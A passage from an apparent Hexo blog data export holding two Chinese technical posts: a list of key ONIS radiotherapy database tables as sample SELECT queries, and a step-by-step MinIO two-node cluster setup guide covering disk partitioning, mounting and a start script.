这个视图将opatient和ostudy表放在一起,以治疗单为单位\n\n```\n","slug":"重点数据库","published":1,"updated":"2023-03-10T02:49:36.465Z","_id":"clf1y563q0006b8vg9xp52ceg","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"onis运维重点数据库表\"><a href=\"#onis运维重点数据库表\" class=\"headerlink\" title=\"onis运维重点数据库表\"></a>onis运维重点数据库表</h2><pre class=\"line-numbers language-none\"><code class=\"language-none\">SELECT * from onis.opatient limit 5 -- 病人信息 \n\nSELECT * FROM onis.visit limit 5 -- 放疗疗程 \n\n在登记的时候会同时保存这两张表 \n\nSELECT * FROM onis.ostudy limit 5 -- 放射治疗检查（表单，一个ct申请就是一个治疗 一个精确治疗申请也是一个治疗） 自关联 \n\nSELECT * FROM onis.planfield2d LIMIT 5 -- 射野的信息\n\nSELECT * FROM onis.bookingmsg LIMIT 5  -- 预约信息 设备预约 每个格子都有记录 \n\nSELECT * FROM onis.signexecmsg LIMIT 5 -- 签字表，签到、治理记录信息\n\nSELECT * FROM onis.studyrecord LIMIT 5 -- 签字的流程表，签字按照这个流程来 \n\nSELECT * FROM onis.studyequipment LIMIT 5 -- 设备表 如定位机 ct定位机等 他们的信息都在这里面\n\nSELECT * FROM onis.studyflow LIMIT 5 -- 治疗单类型\n\nSELECT * FROM onis.moulddefmsg LIMIT 5 -- 治疗单模板\n\nSELECT * FROM onis.eacode LIMIT 5 -- 数据字典表\n\nSELECT * FROM onis.projectrelation LIMIT 5 -- 治疗单模板里设置的数据元\n\nSELECT * FROM onis.eaparam LIMIT 5 -- 系统相关的信息\n\nSELECT * FROM onis.view_visit LIMIT 5 -- 这个视图将opatient和visit表放在一起\n\nSELECT * FROM onis.view_studyvisit LIMIT 5 -- 这个视图将opatient和ostudy表放在一起,以治疗单为单位\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"onis运维重点数据库表\"><a href=\"#onis运维重点数据库表\" class=\"headerlink\" title=\"onis运维重点数据库表\"></a>onis运维重点数据库表</h2><pre class=\"line-numbers language-none\"><code class=\"language-none\">SELECT * from onis.opatient limit 5 -- 病人信息 \n\nSELECT * FROM onis.visit limit 5 -- 放疗疗程 \n\n在登记的时候会同时保存这两张表 \n\nSELECT * FROM onis.ostudy limit 5 -- 放射治疗检查（表单，一个ct申请就是一个治疗 一个精确治疗申请也是一个治疗） 自关联 \n\nSELECT * FROM onis.planfield2d LIMIT 5 -- 射野的信息\n\nSELECT * FROM onis.bookingmsg LIMIT 5  -- 预约信息 设备预约 每个格子都有记录 \n\nSELECT * FROM onis.signexecmsg LIMIT 5 -- 签字表，签到、治理记录信息\n\nSELECT * FROM onis.studyrecord LIMIT 5 -- 签字的流程表，签字按照这个流程来 \n\nSELECT * FROM onis.studyequipment LIMIT 5 -- 设备表 如定位机 ct定位机等 他们的信息都在这里面\n\nSELECT * FROM onis.studyflow LIMIT 5 -- 治疗单类型\n\nSELECT * FROM onis.moulddefmsg LIMIT 5 -- 治疗单模板\n\nSELECT * FROM onis.eacode LIMIT 5 -- 数据字典表\n\nSELECT * FROM onis.projectrelation LIMIT 5 -- 治疗单模板里设置的数据元\n\nSELECT * FROM onis.eaparam LIMIT 5 -- 系统相关的信息\n\nSELECT * FROM onis.view_visit LIMIT 5 -- 这个视图将opatient和visit表放在一起\n\nSELECT * FROM onis.view_studyvisit LIMIT 5 -- 这个视图将opatient和ostudy表放在一起,以治疗单为单位\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n"},{"title":"minio集群搭建","top":false,"cover":false,"toc":true,"mathjax":true,"date":"2023-03-16T04:44:49.000Z","password":"5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87","summary":"minio集群搭建","_content":"\n# 概述\n\n> MinIO 是在 GNU Affero 通用公共许可证 v3.0 下发布的高性能对象存储。它与 Amazon S3 云存储服务 API 兼容。使用 MinIO 为机器学习、分析和应用程序数据工作负载构建高性能基础架构\n\n[`官网`](https://min.io/)\n\n[`github`](https://github.com/minio/minio)\n\n## 基本概念\n\n> - `S3`: Simple Storage Service，简单存储服务，这个概念是Amazon在2006年推出的，对象存储就是从那个时候诞生的。S3提供了一个简单Web服务接口，可用于随时在Web上的任何位置存储和检索任何数量的数据 \n\n> - `Object`: 存储到 Minio 的基本对象，如文件、字节流，Anything\n\n> - `Bucket`: 用来存储 Object 的逻辑空间。每个 Bucket 之间的数据是相互隔离的\n\n> - `Drive`: 部署 Minio 时设置的磁盘，Minio 中所有的对象数据都会存储在 Drive 里\n\n> - `Set`: 一组 Drive 的集合，分布式部署根据集群规模自动划分一个或多个 Set ，每个 Set 中的 Drive 分布在不同位置\n\n## 纠删码（Erasure Code）\n\n> 纠删码（Erasure Code）简称EC，是一种数据保护方法，它将数据分割成片段，把冗余数据块扩展、编码，并将其存储在不同的位置，比如磁盘、存储节点或者其它地理位置\n\n\n# 集群\n\n> 两台主机，每台主机4个磁盘\n\n## 每台机子创建相关目录\n```shell\nmkdir /home/minio/{app,run,logs,config,data}\n```\n`data`:磁盘目录都放这里\n`app`:minio可执行文件\n`run`:启动脚本\n`logs`:日志目录\n`config`:配置目录\n\n## 下载minio\n\n> `cd /home/minio/app`\n\n```shell\nwget https://dl.min.io/server/minio/release/linux-amd64/minio\nchmod +x minio\n```\n\n## 每台机子创建四个目录（用于分区挂载）\n```shell\nmkdir /home/minio/data/{data1,data2,data3,data4} -pv\n```\n\n## 分区挂载(每台机子)\n\n查看新磁盘,一般会看到磁盘名称`/dev/sdb`\n```shell\nfdisk -l\n```\n\n对磁盘进行分区\n```shell\nfdisk /dev/sdb\n```\n\n会有提示输入参数\n```shell\ncommand (m for help):n # 分区\nSelect (default p):p # 主分区\nPartition number(1-4):enter # 默认就可以只能4个主分区\nFirst cylinder (1-15908,default 1):enter # 默认\nLast sector, +sectors or +size{K,M,G,T,P}(2048-10485759， default 10485759):+2G # 分区大小,磁盘大小必须>1G\ncommand (m for help):w # 保存\n```\n\n格式化磁盘\n```shell\nmkfs.ext4 /dev/sdb1\nmkfs.ext4 /dev/sdb2\nmkfs.ext4 /dev/sdb3\nmkfs.ext4 /dev/sdb4\n```\n\n挂载\n```shell\nmount /dev/sdb1 /home/minio/data/data1\nmount /dev/sdb2 /home/minio/data/data2\nmount /dev/sdb3 /home/minio/data/data3\nmount /dev/sdb4 /home/minio/data/data4\n```\n\n## 配置\n\n> Minio默认9000端口，在配置文件中加入–address “:9029” 可更改端口\n\n> - `MINIO_ACCESS_KEY`: 用户名，长度最小是5个字符\n\n> - `MINIO_SECRET_KEY`: 密码，密码不能设置过于简单，不然minio会启动失败，长度最小是8个字符\n\n> - `--config-dir`: 指定集群配置文件目录\n\n> - `--address`: api的端口，默认是9000\n\n> - `--console-address`: web端口，默认随机\n\n### 编写启动脚本\n\n> `vim /home/minio/run/run.sh`\n\n```shell\n#!/bin/bash\nexport MINIO_ROOT_USER=admin\nexport MINIO_ROOT_PASSWORD=admin123456\n\n# 在每台机器上都执行该文件，即以分布式的方式启动了MINIO\n# --address \":9000\" 挂载9001端口为api端口（如Java客户端）访问的端口\n# --console-address \":9000\" 挂载9000端口为web端口； \n/home/minio/app/minio server --address \":9000\" --console-address \":9001\" --config-dir /home/minio/config \\\nhttp://local-168-182-110/home/minio/data/data1 \\\nhttp://local-168-182-110/home/minio/data/data2 \\\nhttp://local-168-182-110/home/minio/data/data3 \\\nhttp://local-168-182-110/home/minio/data/data4 \\\n\nhttp://local-168-182-111/home/minio/data/data1 \\\nhttp://local-168-182-111/home/minio/data/data2 \\\nhttp://local-168-182-111/home/minio/data/data3 \\\nhttp://local-168-182-111/home/minio/data/data4 > /home/minio/logs/minio_server.log\n```\n\n> 下面脚本复制时 \\ 后不要有空格，还有就是上面的目录是对应的一块磁盘，而非简单的在/home/minio/data目录下创建四个目录，要不然会报如下错误，看提示以为是root权限问题`part of root disk, will not be used (*errors.errorString)`\n\n### 启动服务\n```shell\n# 在每台机器上都执行该文件，即以分布式的方式启动了MINIO\nchomod +x /home/minio/run/run.sh\nsh /home/minio/run/run.sh\n```","source":"_posts/minio集群搭建.md","raw":"---\ntitle: minio集群搭建\ntop: false\ncover: false\ntoc: true\nmathjax: true\ndate: 2023-03-16 12:44:49\npassword: 5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87\nsummary: minio集群搭建\ntags: minio\ncategories: storage\n---\n\n# 概述\n\n> MinIO 是在 GNU Affero 通用公共许可证 v3.0 下发布的高性能对象存储。它与 Amazon S3 云存储服务 API 兼容。使用 MinIO 为机器学习、分析和应用程序数据工作负载构建高性能基础架构\n\n[`官网`](https://min.io/)\n\n[`github`](https://github.com/minio/minio)\n\n## 基本概念\n\n> - `S3`: Simple Storage Service，简单存储服务，这个概念是Amazon在2006年推出的，对象存储就是从那个时候诞生的。S3提供了一个简单Web服务接口，可用于随时在Web上的任何位置存储和检索任何数量的数据 \n\n> - `Object`: 存储到 Minio 的基本对象，如文件、字节流，Anything\n\n> - `Bucket`: 用来存储 Object 的逻辑空间。每个 Bucket 之间的数据是相互隔离的\n\n> - `Drive`: 部署 Minio 时设置的磁盘，Minio 中所有的对象数据都会存储在 Drive 里\n\n> - `Set`: 一组 Drive 的集合，分布式部署根据集群规模自动划分一个或多个 Set ，每个 Set 中的 Drive 分布在不同位置\n\n## 纠删码（Erasure Code）\n\n> 纠删码（Erasure Code）简称EC，是一种数据保护方法，它将数据分割成片段，把冗余数据块扩展、编码，并将其存储在不同的位置，比如磁盘、存储节点或者其它地理位置\n\n\n# 集群\n\n> 两台主机，每台主机4个磁盘\n\n## 每台机子创建相关目录\n```shell\nmkdir /home/minio/{app,run,logs,config,data}\n```\n`data`:磁盘目录都放这里\n`app`:minio可执行文件\n`run`:启动脚本\n`logs`:日志目录\n`config`:配置目录\n\n## 下载minio\n\n> `cd /home/minio/app`\n\n```shell\nwget https://dl.min.io/server/minio/release/linux-amd64/minio\nchmod +x minio\n```\n\n## 每台机子创建四个目录（用于分区挂载）\n```shell\nmkdir /home/minio/data/{data1,data2,data3,data4} -pv\n```\n\n## 分区挂载(每台机子)\n\n查看新磁盘,一般会看到磁盘名称`/dev/sdb`\n```shell\nfdisk -l\n```\n\n对磁盘进行分区\n```shell\nfdisk /dev/sdb\n```\n\n会有提示输入参数\n```shell\ncommand (m for help):n # 分区\nSelect (default p):p # 主分区\nPartition number(1-4):enter # 默认就可以只能4个主分区\nFirst cylinder (1-15908,default 1):enter # 默认\nLast sector, +sectors or +size{K,M,G,T,P}(2048-10485759， default 10485759):+2G # 分区大小,磁盘大小必须>1G\ncommand (m for help):w # 保存\n```\n\n格式化磁盘\n```shell\nmkfs.ext4 /dev/sdb1\nmkfs.ext4 /dev/sdb2\nmkfs.ext4 /dev/sdb3\nmkfs.ext4 /dev/sdb4\n```\n\n挂载\n```shell\nmount /dev/sdb1 /home/minio/data/data1\nmount /dev/sdb2 /home/minio/data/data2\nmount /dev/sdb3 /home/minio/data/data3\nmount /dev/sdb4 /home/minio/data/data4\n```\n\n## 配置\n\n> Minio默认9000端口，在配置文件中加入–address “:9029” 可更改端口\n\n> - `MINIO_ACCESS_KEY`: 用户名，长度最小是5个字符\n\n> - `MINIO_SECRET_KEY`: 密码，密码不能设置过于简单，不然minio会启动失败，长度最小是8个字符\n\n> - `--config-dir`: 指定集群配置文件目录\n\n> - `--address`: api的端口，默认是9000\n\n> - `--console-address`: web端口，默认随机\n\n### 编写启动脚本\n\n> `vim /home/minio/run/run.sh`\n\n```shell\n#!/bin/bash\nexport MINIO_ROOT_USER=admin\nexport MINIO_ROOT_PASSWORD=admin123456\n\n# 在每台机器上都执行该文件，即以分布式的方式启动了MINIO\n# --address \":9000\" 挂载9001端口为api端口（如Java客户端）访问的端口\n# --console-address \":9000\" 挂载9000端口为web端口； \n/home/minio/app/minio server --address \":9000\" --console-address \":9001\" --config-dir /home/minio/config \\\nhttp://local-168-182-110/home/minio/data/data1 \\\nhttp://local-168-182-110/home/minio/data/data2 \\\nhttp://local-168-182-110/home/minio/data/data3 \\\nhttp://local-168-182-110/home/minio/data/data4 \\\n\nhttp://local-168-182-111/home/minio/data/data1 \\\nhttp://local-168-182-111/home/minio/data/data2 \\\nhttp://local-168-182-111/home/minio/data/data3 \\\nhttp://local-168-182-111/home/minio/data/data4 > /home/minio/logs/minio_server.log\n```\n\n> 下面脚本复制时 \\ 后不要有空格，还有就是上面的目录是对应的一块磁盘，而非简单的在/home/minio/data目录下创建四个目录，要不然会报如下错误，看提示以为是root权限问题`part of root disk, will not be used (*errors.errorString)`\n\n### 启动服务\n```shell\n# 在每台机器上都执行该文件，即以分布式的方式启动了MINIO\nchomod +x /home/minio/run/run.sh\nsh /home/minio/run/run.sh\n```","slug":"minio集群搭建","published":1,"updated":"2023-03-16T07:29:36.170Z","_id":"clfaofk440000ssvgfbd01da4","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><blockquote>\n<p>MinIO 是在 GNU Affero 通用公共许可证 v3.0 下发布的高性能对象存储。它与 Amazon S3 云存储服务 API 兼容。使用 MinIO 为机器学习、分析和应用程序数据工作负载构建高性能基础架构</p>\n</blockquote>\n<p><a href=\"https://min.io/\"><code>官网</code></a></p>\n<p><a href=\"https://github.com/minio/minio\"><code>github</code></a></p>\n<h2 id=\"基本概念\"><a href=\"#基本概念\" class=\"headerlink\" title=\"基本概念\"></a>基本概念</h2><blockquote>\n<ul>\n<li><code>S3</code>: Simple Storage Service，简单存储服务，这个概念是Amazon在2006年推出的，对象存储就是从那个时候诞生的。S3提供了一个简单Web服务接口，可用于随时在Web上的任何位置存储和检索任何数量的数据 </li>\n</ul>\n</blockquote>\n<blockquote>\n<ul>\n<li><code>Object</code>: 存储到 Minio 的基本对象，如文件、字节流，Anything</li>\n</ul>\n</blockquote>\n<blockquote>\n<ul>\n<li><code>Bucket</code>: 用来存储 Object 的逻辑空间。每个 Bucket 之间的数据是相互隔离的</li>\n</ul>\n</blockquote>\n<blockquote>\n<ul>\n<li><code>Drive</code>: 部署 Minio 时设置的磁盘，Minio 中所有的对象数据都会存储在 Drive 里</li>\n</ul>\n</blockquote>\n<blockquote>\n<ul>\n<li><code>Set</code>: 一组 Drive 的集合，分布式部署根据集群规模自动划分一个或多个 Set ，每个 Set 中的 Drive 分布在不同位置</li>\n</ul>\n</blockquote>\n<h2 id=\"纠删码（Erasure-Code）\"><a href=\"#纠删码（Erasure-Code）\" class=\"headerlink\" title=\"纠删码（Erasure Code）\"></a>纠删码（Erasure Code）</h2><blockquote>\n<p>纠删码（Erasure Code）简称EC，是一种数据保护方法，它将数据分割成片段，把冗余数据块扩展、编码，并将其存储在不同的位置，比如磁盘、存储节点或者其它地理位置</p>\n</blockquote>\n<h1 id=\"集群\"><a href=\"#集群\" class=\"headerlink\" title=\"集群\"></a>集群</h1><blockquote>\n<p>两台主机，每台主机4个磁盘</p>\n</blockquote>\n<h2 id=\"每台机子创建相关目录\"><a href=\"#每台机子创建相关目录\" class=\"headerlink\" title=\"每台机子创建相关目录\"></a>每台机子创建相关目录</h2><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">mkdir</span> /home/minio/<span class=\"token punctuation\">&#123;</span>app,run,logs,config,data<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><code>data</code>:磁盘目录都放这里<br><code>app</code>:minio可执行文件<br><code>run</code>:启动脚本<br><code>logs</code>:日志目录<br><code>config</code>:配置目录</p>\n<h2 id=\"下载minio\"><a href=\"#下载minio\" class=\"headerlink\" title=\"下载minio\"></a>下载minio</h2><blockquote>\n<p><code>cd /home/minio/app</code></p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">wget</span> https://dl.min.io/server/minio/release/linux-amd64/minio\n<span class=\"token function\">chmod</span> +x minio<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h2 id=\"每台机子创建四个目录（用于分区挂载）\"><a href=\"#每台机子创建四个目录（用于分区挂载）\" class=\"headerlink\" title=\"每台机子创建四个目录（用于分区挂载）\"></a>每台机子创建四个目录（用于分区挂载）</h2><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">mkdir</span> /home/minio/data/<span class=\"token punctuation\">&#123;</span>data1,data2,data3,data4<span class=\"token punctuation\">&#125;</span> <span class=\"token parameter variable\">-pv</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h2 id=\"分区挂载-每台机子\"><a href=\"#分区挂载-每台机子\" class=\"headerlink\" title=\"分区挂载(每台机子)\"></a>分区挂载(每台机子)</h2><p>查看新磁盘,一般会看到磁盘名称<code>/dev/sdb</code></p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">fdisk</span> <span class=\"token parameter variable\">-l</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>对磁盘进行分区</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">fdisk</span> /dev/sdb<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>会有提示输入参数</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token builtin class-name\">command</span> <span class=\"token punctuation\">(</span>m <span class=\"token keyword\">for</span> <span class=\"token builtin class-name\">help</span><span class=\"token punctuation\">)</span>:n <span class=\"token comment\"># 分区</span>\nSelect <span class=\"token punctuation\">(</span>default p<span class=\"token punctuation\">)</span>:p <span class=\"token comment\"># 主分区</span>\nPartition number<span class=\"token punctuation\">(</span><span class=\"token number\">1</span>-4<span class=\"token punctuation\">)</span>:enter <span class=\"token comment\"># 默认就可以只能4个主分区</span>\nFirst cylinder <span class=\"token punctuation\">(</span><span class=\"token number\">1</span>-15908,default <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>:enter <span class=\"token comment\"># 默认</span>\nLast sector, +sectors or +size<span class=\"token punctuation\">&#123;</span>K,M,G,T,P<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">(</span><span class=\"token number\">2048</span>-10485759， default <span class=\"token number\">10485759</span><span class=\"token punctuation\">)</span>:+2G <span class=\"token comment\"># 分区大小,磁盘大小必须>1G</span>\n<span class=\"token builtin class-name\">command</span> <span class=\"token punctuation\">(</span>m <span class=\"token keyword\">for</span> <span class=\"token builtin class-name\">help</span><span class=\"token punctuation\">)</span>:w <span class=\"token comment\"># 保存</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>格式化磁盘</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">mkfs.ext4 /dev/sdb1\nmkfs.ext4 /dev/sdb2\nmkfs.ext4 /dev/sdb3\nmkfs.ext4 /dev/sdb4<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>挂载</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">mount</span> /dev/sdb1 /home/minio/data/data1\n<span class=\"token function\">mount</span> /dev/sdb2 /home/minio/data/data2\n<span class=\"token function\">mount</span> /dev/sdb3 /home/minio/data/data3\n<span class=\"token function\">mount</span> /dev/sdb4 /home/minio/data/data4<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h2><blockquote>\n<p>Minio默认9000端口，在配置文件中加入–address “:9029” 可更改端口</p>\n</blockquote>\n<blockquote>\n<ul>\n<li><code>MINIO_ACCESS_KEY</code>: 用户名，长度最小是5个字符</li>\n</ul>\n</blockquote>\n<blockquote>\n<ul>\n<li><code>MINIO_SECRET_KEY</code>: 密码，密码不能设置过于简单，不然minio会启动失败，长度最小是8个字符</li>\n</ul>\n</blockquote>\n<blockquote>\n<ul>\n<li><code>--config-dir</code>: 指定集群配置文件目录</li>\n</ul>\n</blockquote>\n<blockquote>\n<ul>\n<li><code>--address</code>: api的端口，默认是9000</li>\n</ul>\n</blockquote>\n<blockquote>\n<ul>\n<li><code>--console-address</code>: web端口，默认随机</li>\n</ul>\n</blockquote>\n<h3 id=\"编写启动脚本\"><a href=\"#编写启动脚本\" class=\"headerlink\" title=\"编写启动脚本\"></a>编写启动脚本</h3><blockquote>\n<p><code>vim /home/minio/run/run.sh</code></p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token shebang important\">#!/bin/bash</span>\n<span class=\"token builtin class-name\">export</span> <span class=\"token assign-left variable\">MINIO_ROOT_USER</span><span class=\"token operator\">=</span>admin\n<span class=\"token builtin class-name\">export</span> <span class=\"token assign-left variable\">MINIO_ROOT_PASSWORD</span><span class=\"token operator\">=</span>admin123456\n\n<span class=\"token comment\"># 在每台机器上都执行该文件，即以分布式的方式启动了MINIO</span>\n<span class=\"token comment\"># --address \":9000\" 挂载9001端口为api端口（如Java客户端）访问的端口</span>\n<span class=\"token comment\"># --console-address \":9000\" 挂载9000端口为web端口； </span>\n/home/minio/app/minio server <span class=\"token parameter variable\">--address</span> <span class=\"token string\">\":9000\"</span> --console-address <span class=\"token string\">\":9001\"</span> --config-dir /home/minio/config <span class=\"token punctuation\">\\</span>\nhttp://local-168-182-110/home/minio/data/data1 <span class=\"token punctuation\">\\</span>\nhttp://local-168-182-110/home/minio/data/data2 <span class=\"token punctuation\">\\</span>\nhttp://local-168-182-110/home/minio/data/data3 <span class=\"token punctuation\">\\</span>\nhttp://local-168-182-110/home/minio/data/data4 <span class=\"token punctuation\">\\</span>\n\nhttp://local-168-182-111/home/minio/data/data1 <span class=\"token punctuation\">\\</span>\nhttp://local-168-182-111/home/minio/data/data2 <span class=\"token punctuation\">\\</span>\nhttp://local-168-182-111/home/minio/data/data3 <span class=\"token punctuation\">\\</span>\nhttp://local-168-182-111/home/minio/data/data4 <span class=\"token operator\">></span> /home/minio/logs/minio_server.log<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>下面脚本复制时 \\ 后不要有空格，还有就是上面的目录是对应的一块磁盘，而非简单的在/home/minio/data目录下创建四个目录，要不然会报如下错误，看提示以为是root权限问题<code>part of root disk, will not be used (*errors.errorString)</code></p>\n</blockquote>\n<h3 id=\"启动服务\"><a href=\"#启动服务\" class=\"headerlink\" title=\"启动服务\"></a>启动服务</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token comment\"># 在每台机器上都执行该文件，即以分布式的方式启动了MINIO</span>\nchomod +x /home/minio/run/run.sh\n<span class=\"token function\">sh</span> /home/minio/run/run.sh<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><blockquote>\n<p>MinIO 是在 GNU Affero 通用公共许可证 v3.0 下发布的高性能对象存储。它与 Amazon S3 云存储服务 API 兼容。使用 MinIO 为机器学习、分析和应用程序数据工作负载构建高性能基础架构</p>\n</blockquote>\n<p><a href=\"https://min.io/\"><code>官网</code></a></p>\n<p><a href=\"https://github.com/minio/minio\"><code>github</code></a></p>\n<h2 id=\"基本概念\"><a href=\"#基本概念\" class=\"headerlink\" title=\"基本概念\"></a>基本概念</h2><blockquote>\n<ul>\n<li><code>S3</code>: Simple Storage Service，简单存储服务，这个概念是Amazon在2006年推出的，对象存储就是从那个时候诞生的。S3提供了一个简单Web服务接口，可用于随时在Web上的任何位置存储和检索任何数量的数据 </li>\n</ul>\n</blockquote>\n<blockquote>\n<ul>\n<li><code>Object</code>: 存储到 Minio 的基本对象，如文件、字节流，Anything</li>\n</ul>\n</blockquote>\n<blockquote>\n<ul>\n<li><code>Bucket</code>: 用来存储 Object 的逻辑空间。每个 Bucket 之间的数据是相互隔离的</li>\n</ul>\n</blockquote>\n<blockquote>\n<ul>\n<li><code>Drive</code>: 部署 Minio 时设置的磁盘，Minio 中所有的对象数据都会存储在 Drive 里</li>\n</ul>\n</blockquote>\n<blockquote>\n<ul>\n<li><code>Set</code>: 一组 Drive 的集合，分布式部署根据集群规模自动划分一个或多个 Set ，每个 Set 中的 Drive 分布在不同位置</li>\n</ul>\n</blockquote>\n<h2 id=\"纠删码（Erasure-Code）\"><a href=\"#纠删码（Erasure-Code）\" class=\"headerlink\" title=\"纠删码（Erasure Code）\"></a>纠删码（Erasure Code）</h2><blockquote>\n<p>纠删码（Erasure Code）简称EC，是一种数据保护方法，它将数据分割成片段，把冗余数据块扩展、编码，并将其存储在不同的位置，比如磁盘、存储节点或者其它地理位置</p>\n</blockquote>\n<h1 id=\"集群\"><a href=\"#集群\" class=\"headerlink\" title=\"集群\"></a>集群</h1><blockquote>\n<p>两台主机，每台主机4个磁盘</p>\n</blockquote>\n<h2 id=\"每台机子创建相关目录\"><a href=\"#每台机子创建相关目录\" class=\"headerlink\" title=\"每台机子创建相关目录\"></a>每台机子创建相关目录</h2><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">mkdir</span> /home/minio/<span class=\"token punctuation\">&#123;</span>app,run,logs,config,data<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><code>data</code>:磁盘目录都放这里<br><code>app</code>:minio可执行文件<br><code>run</code>:启动脚本<br><code>logs</code>:日志目录<br><code>config</code>:配置目录</p>\n<h2 id=\"下载minio\"><a href=\"#下载minio\" class=\"headerlink\" title=\"下载minio\"></a>下载minio</h2><blockquote>\n<p><code>cd /home/minio/app</code></p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">wget</span> https://dl.min.io/server/minio/release/linux-amd64/minio\n<span class=\"token function\">chmod</span> +x minio<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h2 id=\"每台机子创建四个目录（用于分区挂载）\"><a href=\"#每台机子创建四个目录（用于分区挂载）\" class=\"headerlink\" title=\"每台机子创建四个目录（用于分区挂载）\"></a>每台机子创建四个目录（用于分区挂载）</h2><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">mkdir</span> /home/minio/data/<span class=\"token punctuation\">&#123;</span>data1,data2,data3,data4<span class=\"token punctuation\">&#125;</span> <span class=\"token parameter variable\">-pv</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h2 id=\"分区挂载-每台机子\"><a href=\"#分区挂载-每台机子\" class=\"headerlink\" title=\"分区挂载(每台机子)\"></a>分区挂载(每台机子)</h2><p>查看新磁盘,一般会看到磁盘名称<code>/dev/sdb</code></p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">fdisk</span> <span class=\"token parameter variable\">-l</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>对磁盘进行分区</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">fdisk</span> /dev/sdb<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>会有提示输入参数</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token builtin class-name\">command</span> <span class=\"token punctuation\">(</span>m <span class=\"token keyword\">for</span> <span class=\"token builtin class-name\">help</span><span class=\"token punctuation\">)</span>:n <span class=\"token comment\"># 分区</span>\nSelect <span class=\"token punctuation\">(</span>default p<span class=\"token punctuation\">)</span>:p <span class=\"token comment\"># 主分区</span>\nPartition number<span class=\"token punctuation\">(</span><span class=\"token number\">1</span>-4<span class=\"token punctuation\">)</span>:enter <span class=\"token comment\"># 默认就可以只能4个主分区</span>\nFirst cylinder <span class=\"token punctuation\">(</span><span class=\"token number\">1</span>-15908,default <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>:enter <span class=\"token comment\"># 默认</span>\nLast sector, +sectors or +size<span class=\"token punctuation\">&#123;</span>K,M,G,T,P<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">(</span><span class=\"token number\">2048</span>-10485759， default <span class=\"token number\">10485759</span><span class=\"token punctuation\">)</span>:+2G <span class=\"token comment\"># 分区大小,磁盘大小必须>1G</span>\n<span class=\"token builtin class-name\">command</span> <span class=\"token punctuation\">(</span>m <span 